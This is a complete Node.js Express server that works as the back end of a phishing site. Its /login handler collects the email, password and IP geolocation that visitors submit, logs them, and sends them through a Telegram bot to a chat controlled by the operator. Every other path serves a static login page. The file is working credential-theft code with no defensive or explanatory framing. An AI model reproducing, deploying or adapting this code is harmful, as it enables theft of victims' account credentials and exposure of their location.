const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const port = process.env.PORT || 8080;

if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
  console.error("ERROR: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing.");
  process.exit(1);
}

const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(botToken, { polling: false });

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

app.post("/login", async (req, res) => {
  try {
    const { email, password, ipData } = req.body;

    if (!email || !password || !ipData) {
      return res.status(400).json({ error: "Missing email, password, or IP data" });
    }

    console.log("Login attempt:", { email, password, ipData });

    // Format message for Telegram
    const message = `🔑 Login Attempt:\n📧 Email: ${email}\n🔒 Password: ${password}\n\n🌍 IP Data:\nIP: ${ipData.ip}\nCountry: ${ipData.country_name}\nRegion: ${ipData.region}\nCity: ${ipData.city}\nISP: ${ipData.org}\nLatitude: ${ipData.latitude}\nLongitude: ${ipData.longitude}`;
    
    await bot.sendMessage(chatId, message);

    res.status(200).json({ message: "Login data & IP sent successfully!" });
  } catch (error) {
    console.error("Error handling login:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(port, () => {
  console.log(`✅ Server is running on http://localhost:${port}`);
});
